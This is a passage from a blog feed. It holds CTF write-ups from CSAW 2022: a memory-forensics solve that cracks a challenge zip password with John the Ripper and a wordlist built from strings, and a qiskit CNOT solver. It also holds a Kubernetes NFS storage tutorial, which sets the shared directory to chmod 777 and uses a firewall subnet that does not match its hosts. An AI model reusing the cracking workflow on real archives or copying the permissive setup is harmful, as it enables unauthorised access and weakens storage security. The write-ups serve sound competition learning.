class=\"variable\">$rockyou</span> zip.hash</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password <span class=\"built_in\">hash</span> (PKZIP [32/64])</span><br><span class=\"line\">No password hashes left to crack (see FAQ)</span><br></pre></td></tr></table></figure>\n<p>Wait what??? The password wasn’t found on rockyou! What the hack?? After some investigating we remember that there is a text file called  <code>dic_fr_l33t.txt</code> ! dic means dictionary and fr means french right ? Oh man we need to recover this wordlist! But the user deleted it. I’ll give a chance to  <code>linux_find_file</code> . Let’s try to dump this text file. It might be stil loaded in the memory right?</p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -L | grep dic_fr</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br><span class=\"line\">3 0xffff88000c135cd8 /media/sf_DUMP/dir1/dic_fr_l33t.txt</span><br><span class=\"line\">vol.py -f memory.raw --profile=LinuxUbuntu1604-lowx64 linux_find_file -i 0xffff88000c135cd8 -O dic_fr_l33t.txt</span><br><span class=\"line\">Volatility Foundation Volatility Framework 2.6.1</span><br></pre></td></tr></table></figure>\n<p>Ah God! The extracted file is empty. We need another way to recover the wordlist and with an elegent way<br>\nAfter some minutes of thinking. We decide to use a regex that allow us to collect words that not contains special chars like  <code>&#123;_;&#125;/][-</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Extract the hash of the password</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ strings memory.raw | grep -v <span class=\"string\">&quot; \\|\\_\\|\\-\\|\\[\\|\\]\\|\\`\\|\\;\\|\\/\\|\\.\\|\\&#125;\\|\\&#123;&quot;</span> | <span class=\"built_in\">sort</span> | <span class=\"built_in\">uniq</span> | <span class=\"built_in\">sort</span> &gt; myrock.txt</span><br><span class=\"line\">4n6nk8s@csaw2022:~/mnt/dir2$ sudo john --wordlist=~/myrock.txt zip.hash</span><br><span class=\"line\">Using default input encoding: UTF-8</span><br><span class=\"line\">Loaded 1 password <span class=\"built_in\">hash</span> (PKZIP [32/64])</span><br><span class=\"line\">Will run 8 OpenMP threads</span><br><span class=\"line\">Press <span class=\"string\">&#x27;q&#x27;</span> or Ctrl-C to abort, almost any other key <span class=\"keyword\">for</span> status</span><br><span class=\"line\">Cyb3rs3curit3    (end.zip/flag.gif)</span><br><span class=\"line\">1g 0:00:00:00 DONE (2022-09-12 20:34) 6.666g/s 655360p/s 655360c/s 655360C/s Coup3ri3z..D3fouraillions</span><br><span class=\"line\">Use the <span class=\"string\">&quot;--show&quot;</span> option to display all of the cracked passwords reliably</span><br><span class=\"line\">Session completed.</span><br></pre></td></tr></table></figure>\n<p>Oh man we did it! The password of the protected  <code>end.zip</code>  is  <code>Cyb3rs3curit3</code>  (CyberSecurité).Let’s extract the  <code>flag.gif</code>  file now…</p>\n<p><img data-src=\"https://imgur.com/jZoDJhE.gif\" alt=\"\"><br>\nLet’s convert this gif to frames using  <code>ffmpeg</code>  utility, the magical one xD</p>\n<figure class=\"highlight bash\"><figcaption><span>Split the gif</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ <span class=\"built_in\">mkdir</span> temp ; ffmpeg -i /mnt/dir2/flag.gif -vsync 0 temp/temp%d.png</span><br><span class=\"line\">Input <span class=\"comment\">#0, gif, from &#x27;flag.gif&#x27;:</span></span><br><span class=\"line\">  Duration: 00:00:03.60, start: 0.000000, bitrate: 200 kb/s</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0: Video: gif, bgra, 290x290, 10 fps, 10 tbr, 100 tbn</span></span><br><span class=\"line\">Stream mapping:</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0 -&gt; #0:0 (gif (native) -&gt; png (native))</span></span><br><span class=\"line\">Press [q] to stop, [?] <span class=\"keyword\">for</span> <span class=\"built_in\">help</span></span><br><span class=\"line\">Output <span class=\"comment\">#0, image2, to &#x27;temp/temp%d.png&#x27;:</span></span><br><span class=\"line\">  Metadata:</span><br><span class=\"line\">    encoder         : Lavf59.27.100</span><br><span class=\"line\">  Stream <span class=\"comment\">#0:0: Video: png, rgba(pc, gbr/unknown/unknown, progressive), 290x290, q=2-31, 200 kb/s, 10 fps, 10 tbn</span></span><br><span class=\"line\">    Metadata:</span><br><span class=\"line\">      encoder         : Lavc59.37.100 png</span><br><span class=\"line\">frame=   36 fps=0.0 q=-0.0 Lsize=N/A time=00:00:03.60 bitrate=N/A speed=14.8x</span><br><span class=\"line\">video:113kB audio:0kB subtitle:0kB other streams:0kB global headers:0kB muxing overhead: unknown</span><br></pre></td></tr></table></figure>\n<p>We got this images! oh we have 36 QR Code images! Seriously i don’t want to scan it manually!<br>\n<img data-src=\"https://imgur.com/aFiEzTR.png\" alt=\"\"><br>\nLet’s Write a small code that reads all these QRcode images! I am too lazy man !</p>\n<figure class=\"highlight python\"><figcaption><span>Scan QRCode</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">import</span> cv2</span><br><span class=\"line\"></span><br><span class=\"line\">flag=<span class=\"string\">&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"number\">36</span>):</span><br><span class=\"line\"></span><br><span class=\"line\">    img=cv2.imread(<span class=\"string\">&quot;temp&quot;</span>+<span class=\"built_in\">str</span>(i+<span class=\"number\">1</span>)+<span class=\"string\">&quot;.png&quot;</span>)</span><br><span class=\"line\">    det=cv2.QRCodeDetector()</span><br><span class=\"line\">    val, pts, st_code=det.detectAndDecode(img)</span><br><span class=\"line\">    flag+=val[::-<span class=\"number\">1</span>]</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>Let’s run the code now ! I wish this nightmare finish dude! I don’t another step please</p>\n<figure class=\"highlight bash\"><figcaption><span>Run Reader</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@csaw2022:~$ python3 temp/solve.py</span><br><span class=\"line\">The_flag_is:1_Lik3_F0r3nS1c_4nd_y0u?</span><br></pre></td></tr></table></figure>\n<p>And Finally we got the flag!</p>\n<h1 id=\"quantum-leap-misc\"><a class=\"markdownIt-Anchor\" href=\"#quantum-leap-misc\">#</a> Quantum Leap : Misc</h1>\n<details class=\"info\"><summary>Description</summary><div>\n<p>My friend took the quantum leap and purchased a quantum computer with two qubits. They mentioned using a quantum logic gate to input the flag and they gave me the computers output. I have been stuck and Can NOT figure out the flag.</p>\n</div></details>\n<p>Challenge Link &amp; WriteUp Author</p>\n<div class=\"links\"><div class=\"item\" title=\"Challenge Link\" style=\"--block-color:#2296fd;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhbmlhTWlkYW91aS9DVEYtd3JpdGV1cHMvYmxvYi9tYWluL0NTQVcyMi9RdWFudHVtJTIwTGVhcC9vdXRwdXQudHh0\" data-background-image=\"https://ctftime.org/media/events/logo_48.png\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly9naXRodWIuY29tL1JhbmlhTWlkYW91aS9DVEYtd3JpdGV1cHMvYmxvYi9tYWluL0NTQVcyMi9RdWFudHVtJTIwTGVhcC9vdXRwdXQudHh0\">Challenge Link</span>\n          <p class=\"desc\">CSAW 2022 - Quantum Leap</p>\n          </div></div><div class=\"item\" title=\"Writeup Author - Mida0ui\" style=\"--block-color:#de2336;\"><span class=\"exturl image\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\" data-background-image=\"https://media-exp1.licdn.com/dms/image/C4D03AQHOP8zn9x9nKw/profile-displayphoto-shrink_800_800/0/1643659005590?e=1668643200&v=beta&t=FV5YWMygs2bbclfvgFIUtPgjIedq8tGiKWxopxK2_yU\"></span>\n          <div class=\"info\">\n          <span class=\"exturl title\" data-url=\"aHR0cHM6Ly93d3cubGlua2VkaW4uY29tL2luL3JhbmlhLW1pZGFvdWktYjAxNjNhMWJiLw==\">Writeup Author - Mida0ui</span>\n          <p class=\"desc\">Mida0ui Linkedin Profile</p>\n          </div></div></div>\n<p>The description mentions that we’re dealing with a quantum computer with two qubits, se we can assume that the gate the person used to get the output is a two-qubit quantum logic gate.</p>\n<p>A quantum gate is basic quantum circuit operating on a small number of qubits, they perform operations to change the state of the qubits, and unlike many classical logic gates, quantum logic gates are reversible.<br>\nEach quantum gate has its matrix, and since the qubit states are represented with vectors, the gates transform these vectors to get new states.<br>\nThe state vectors of the states |0&gt; and |1&gt; are:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190504993-8094b514-dfa2-472f-8622-59867ef2e061.png\" alt=\"2022-09-15_19h32_37\"></p>\n<p>The CNOT gate was applied, it’s a two-qubit quantum gate that performs a controlled NOT where one qubit is the control and the second qubit is the target.<br>\nIts matrix is the following :</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190486028-970479de-3ff1-415e-bdd2-b4f0e6c8dab2.png\" alt=\"2022-09-15_19h33_11\"></p>\n<p>When applied:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190497970-bd14060b-e413-43b6-982a-17da2d1c18a5.png\" alt=\"2022-09-15_20h47_02\"></p>\n<p>The mathematics behind these results are simple:</p>\n<p>Lets take |10&gt; and |11&gt;:</p>\n<p><img data-src=\"https://user-images.githubusercontent.com/68945305/190505635-f998a0df-a328-4230-a3f1-1e3be73a5cef.png\" alt=\"2022-09-15_21h46_45\"></p>\n<p>This ⊗ represents a tensor product, you can read about it here if you don’t know what it is : <span class=\"exturl\" data-url=\"aHR0cHM6Ly93d3cubWF0aDNtYS5jb20vYmxvZy90aGUtdGVuc29yLXByb2R1Y3QtZGVteXN0aWZpZWQ=\">https://www.math3ma.com/blog/the-tensor-product-demystified</span></p>\n<p>The first qubit is usually referred to as the control qubit and the second qubit as the target qubit. Expressed in basis states, the CNOT gate:<br>\nleaves the control qubit unchanged and performs a Pauli-X gate or NOT gate (which just flips the state of the qubit) on the target qubit when the control qubit is in state ∣1⟩;<br>\nleaves the target qubit unchanged when the control qubit is in state ∣0⟩.</p>\n<p>As you may have noticed, this challenge can be done manually by converting the output string to binary, taking two bits at a time and checking the value of the most significant bit, if it’s 1, the other bit is flipped, else, nothing is done.</p>\n<p>I wanted to solve this task with the CNOT gate itself,using the qiskit module in python.<br>\nQiskit is an open-source SDK for working with quantum computers at the level of pulses, circuits, and application modules.</p>\n<p>As mentioned before quantum logic gates are reversible, in this case, when CNOT gate is applied once on the output, we get the flag.</p>\n<p>Here’s the script, you can run it on jupyter notebook:</p>\n<figure class=\"highlight py\"><figcaption><span>Solver</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> qiskit <span class=\"keyword\">import</span> *</span><br><span class=\"line\"></span><br><span class=\"line\">output = <span class=\"string\">&#x27;wxqvn$Zae$&#123;deyZv$d&quot;i&#x27;</span></span><br><span class=\"line\">output_array = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">format</span>(i, <span class=\"string\">&#x27;08b&#x27;</span>) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">bytearray</span>(output, encoding =<span class=\"string\">&#x27;utf-8&#x27;</span>))</span><br><span class=\"line\"></span><br><span class=\"line\">bin_flag = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">state_vect</span>(<span class=\"params\">bit</span>):</span><br><span class=\"line\">    <span class=\"keyword\">if</span>(bit == <span class=\"string\">&#x27;0&#x27;</span>):</span><br><span class=\"line\">        vect = [<span class=\"number\">1</span>, <span class=\"number\">0</span>]</span><br><span class=\"line\">    <span class=\"keyword\">else</span> : </span><br><span class=\"line\">        vect = [<span class=\"number\">0</span> ,<span class=\"number\">1</span>]</span><br><span class=\"line\">    <span class=\"keyword\">return</span> vect</span><br><span class=\"line\"></span><br><span class=\"line\">i = <span class=\"number\">0</span></span><br><span class=\"line\"><span class=\"keyword\">while</span> i&lt;<span class=\"built_in\">len</span>(output_array):</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#Initialize the quantum circuit</span></span><br><span class=\"line\">    q = QuantumRegister(<span class=\"number\">2</span>, <span class=\"string\">&quot;q&quot;</span>)</span><br><span class=\"line\">    c = ClassicalRegister(<span class=\"number\">2</span>, <span class=\"string\">&quot;c&quot;</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    qc = QuantumCircuit(q,c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#get the initial state from the output</span></span><br><span class=\"line\">    vect0 = state_vect(output_array[i])</span><br><span class=\"line\">    vect1 = state_vect(output_array[i+<span class=\"number\">1</span>])</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#initialize the register</span></span><br><span class=\"line\">    qc.initialize(vect1,<span class=\"number\">0</span>)</span><br><span class=\"line\">    qc.initialize(vect0,<span class=\"number\">1</span>)</span><br><span class=\"line\">    </span><br><span class=\"line\">    qc.measure(q, c)</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\">#apply the CNOT gate, q[1] is the control and q[0] is the target</span></span><br><span class=\"line\">    qc.cx(q[<span class=\"number\">1</span>],q[<span class=\"number\">0</span>])</span><br><span class=\"line\"></span><br><span class=\"line\">    qc.measure(q, c)</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#execute the circuit</span></span><br><span class=\"line\">    qobj = assemble(qc, shots=<span class=\"number\">1</span>)</span><br><span class=\"line\">    job = execute(qc,Aer.get_backend(<span class=\"string\">&#x27;qasm_simulator&#x27;</span>),shots=<span class=\"number\">1</span>)</span><br><span class=\"line\">    counts = job.result().get_counts()</span><br><span class=\"line\">    </span><br><span class=\"line\">    bin_flag += <span class=\"built_in\">str</span>(counts)[<span class=\"number\">2</span>:<span class=\"number\">4</span>]</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">#Increment the counter to get the next 2 qubits</span></span><br><span class=\"line\">    i=i+<span class=\"number\">2</span></span><br><span class=\"line\">    </span><br><span class=\"line\">flag = <span class=\"string\">&#x27;&#x27;</span>.join(<span class=\"built_in\">chr</span>(<span class=\"built_in\">int</span>(bin_flag[i*<span class=\"number\">8</span>:i*<span class=\"number\">8</span>+<span class=\"number\">8</span>],<span class=\"number\">2</span>)) <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> <span class=\"built_in\">range</span>(<span class=\"built_in\">len</span>(bin_flag)//<span class=\"number\">8</span>))</span><br><span class=\"line\"><span class=\"built_in\">print</span>(flag)</span><br></pre></td></tr></table></figure>\n<p>The flag is  <code>flag&#123;4_qu4ntum_g4t3&#125;</code></p>\n",
            "tags": []
        },
        {
            "id": "http://example.com/2022/09/10/Kubernetes/nfs-k8s/",
            "url": "http://example.com/2022/09/10/Kubernetes/nfs-k8s/",
            "title": "NFS as Remote Storage for Kubernetes",
            "date_published": "2022-09-10T22:26:58.000Z",
            "content_html": "<p>We will setting up a NFS server to use it as remote storage for our cluster to create a lot of persistent volumes in our local infrastructure !</p>\n<p>We Assume that we have 4 Ubuntu 20.04 LTS, The Kubernetes is installed and the  <code>4n6nk8s-nfs</code>  host in the same network with the cluster :</p>\n<table>\n<thead>\n<tr>\n<th>Role</th>\n<th>Hostname</th>\n<th>IP address</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Master</td>\n<td>4n6nk8s-master</td>\n<td>192.168.1.18/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker1</td>\n<td>192.168.1.19/24</td>\n</tr>\n<tr>\n<td>Worker</td>\n<td>4n6nk8s-worker2</td>\n<td>192.168.1.20/24</td>\n</tr>\n<tr>\n<td>NFS Server</td>\n<td>4n6nk8s-nfs</td>\n<td>192.168.1.80/24</td>\n</tr>\n</tbody>\n</table>\n<h2 id=\"what-is-a-nfs-network-file-system-server\"><a class=\"markdownIt-Anchor\" href=\"#what-is-a-nfs-network-file-system-server\">#</a> What is a NFS (Network File System) Server:</h2>\n<p>Network File System (NFS) is a networking protocol for distributed file sharing. A file system defines the way data in the form of files is stored and retrieved from storage devices, such as hard disk drives, solid-state drives and tape drives. NFS is a network file sharing protocol that defines the way files are stored and retrieved from storage devices across networks.</p>\n<p>This distributed file system protocol allows a user on a client computer to access files over a network in the same way they would access a local storage file.</p>\n<h2 id=\"setting-up-the-nfs-server\"><a class=\"markdownIt-Anchor\" href=\"#setting-up-the-nfs-server\">#</a> Setting up the NFS server</h2>\n<p>We need to install the  <code>nfs-kernel-server</code>  package on the NFS server. This package will store additional packages such as  <code>nfs-common</code>  and  <code>4n6nk8s@rpcbind</code></p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s-nfs:~$ sudo apt install nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p>Now let’s create an NFS Export Directory</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo <span class=\"built_in\">mkdir</span> /mnt/nfs-data </span><br></pre></td></tr></table></figure>\n<p>Now let’s give it a read,write and execute privileges to all the contents inside the directory</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo <span class=\"built_in\">chmod</span> 777 /mnt/nfs-data</span><br></pre></td></tr></table></figure>\n<p>Now Lets add a new line to the  <code>/etc/exports</code>  configuration file.</p>\n<blockquote>\n<p>The  <code>/etc/exports</code>  file indicates all directories that a nfs server exports to its clients. Each line in the file specifies a single directory.</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo vim /etc/exports</span><br></pre></td></tr></table></figure>\n<p>You can provide access to a single client, multiple clients, or specify an entire subnet. In this guide, we have allowed an entire subnet to have access to the NFS share.</p>\n<figure class=\"highlight vim\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">/mnt/nfs-data <span class=\"number\">192.168</span>.<span class=\"number\">1.0</span>/<span class=\"number\">24</span>(rw,<span class=\"keyword\">sync</span>,no_subtree_check)</span><br></pre></td></tr></table></figure>\n<p>After granting access to the subnet, let’s export the NFS share directory and restart the NFS</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo exportfs -a</span><br><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo systemctl restart nfs-kernel-server</span><br></pre></td></tr></table></figure>\n<p>Let’s allow NFS access through the firewall</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ sudo ufw allow from 192.168.43.0/24 to any port nfs</span><br></pre></td></tr></table></figure>\n<h2 id=\"install-the-nfs-client-on-the-kubernetes-nodes\"><a class=\"markdownIt-Anchor\" href=\"#install-the-nfs-client-on-the-kubernetes-nodes\">#</a> Install the NFS Client on the Kubernetes Nodes</h2>\n<p>We must install the  <code>nfs-common</code>  packages to access to the NFS share so let’s install it by running the following command on each node:</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo apt install nfs-common</span><br></pre></td></tr></table></figure>\n<p>This command mount the NFS Share on one node for testing and sanity check only</p>\n<blockquote>\n<p>The mount command is not a mandatory step. We mount for testing purposes. you can skip to the next section</p>\n</blockquote>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ sudo mount 4n6nk8s-nfs:/mnt/nfs-data  /mnt</span><br></pre></td></tr></table></figure>\n<p>Let’s Create a file for testing</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-worker1:~$ <span class=\"built_in\">cd</span> /mnt</span><br><span class=\"line\">4n6nk8s@4n6nk8s-worker1:/mnt $ <span class=\"built_in\">touch</span> file </span><br></pre></td></tr></table></figure>\n<p>Check the  <code>/mnt/nfs-data</code>  on the NFS server</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-nfs:~$ <span class=\"built_in\">cd</span> /mnt/nfs-data</span><br><span class=\"line\">4n6nk8s@4n6nk8s-nfs:/mnt/nfs-data$ <span class=\"built_in\">ls</span></span><br><span class=\"line\">file </span><br></pre></td></tr></table></figure>\n<h2 id=\"kubernetes-with-nfs-remote-storage-demo\"><a class=\"markdownIt-Anchor\" href=\"#kubernetes-with-nfs-remote-storage-demo\">#</a> Kubernetes with NFS remote Storage demo</h2>\n<p>After Setting up the NFS server and install the NFS client on the kubernetes nodes. Now it’s time to do some practice with  <code>Persistent Volume</code>  and  <code>Persistent Volume Claim</code>  with NFS storage.</p>\n<h3 id=\"create-a-persistent-volume-with-nfs\"><a class=\"markdownIt-Anchor\" href=\"#create-a-persistent-volume-with-nfs\">#</a> Create a Persistent Volume with NFS</h3>\n<p>Example of Persistent Volume manifest using nfs:</p>\n<figure class=\"highlight yaml\"><figcaption><span>PersistentVolume</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">PersistentVolume</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pv-nfs</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span class=\"attr\">capacity:</span></span><br><span class=\"line\">    <span class=\"attr\">storage:</span> <span class=\"string\">100Mi</span></span><br><span class=\"line\">  <span class=\"attr\">accessModes:</span></span><br><span class=\"line\">    <span class=\"bullet\">-</span> <span class=\"string\">ReadWriteMany</span></span><br><span class=\"line\">  <span class=\"attr\">storageClassName:</span> <span class=\"string\">nfs</span></span><br><span class=\"line\">  <span class=\"attr\">nfs:</span></span><br><span class=\"line\">    <span class=\"attr\">server:</span> <span class=\"number\">192.168</span><span class=\"number\">.1</span><span class=\"number\">.80</span> <span class=\"comment\"># the IP address of 4n6nk8s-nfs host</span></span><br><span class=\"line\">    <span class=\"attr\">path:</span> <span class=\"string\">&quot;/mnt/nfs-data&quot;</span></span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>Make sure to put the correct IP address of the NFS server and the correct NFS Share point!<br>\nCreate the persistent volume using kubectl</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl apply -f nfs-pv.yaml</span><br><span class=\"line\">persistentvolume/pv-nfs created</span><br></pre></td></tr></table></figure>\n<p>List the Persistent Volumes to make sure for the creation</p>\n<figure class=\"highlight bash\"><figcaption><span>Command Line Prompt</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">4n6nk8s@4n6nk8s-master:~$ kubectl get pv</span><br><span class=\"line\">NAME     CAPACITY   ACCESS MODES   RECLAIM POLICY   STATUS      CLAIM   STORAGECLASS   REASON   AGE</span><br><span class=\"line\">pv-nfs   100Mi      RWX            Retain           Available           nfs                     4s</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<h3 id=\"create-a-persistent-volume-claim-with-nfs\"><a class=\"markdownIt-Anchor\" href=\"#create-a-persistent-volume-claim-with-nfs\">#</a> Create a Persistent Volume Claim with NFS</h3>\n<p>Example of Persistent Volume Claim manifest using nfs:</p>\n<figure class=\"highlight yaml\"><figcaption><span>PersistentVolumeClaim</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"attr\">apiVersion:</span> <span class=\"string\">v1</span></span><br><span class=\"line\"><span class=\"attr\">kind:</span> <span class=\"string\">PersistentVolumeClaim</span></span><br><span class=\"line\"><span class=\"attr\">metadata:</span></span><br><span class=\"line\">  <span class=\"attr\">name:</span> <span class=\"string\">pvc-nfs</span></span><br><span class=\"line\"><span class=\"attr\">spec:</span></span><br><span class=\"line\">  <span 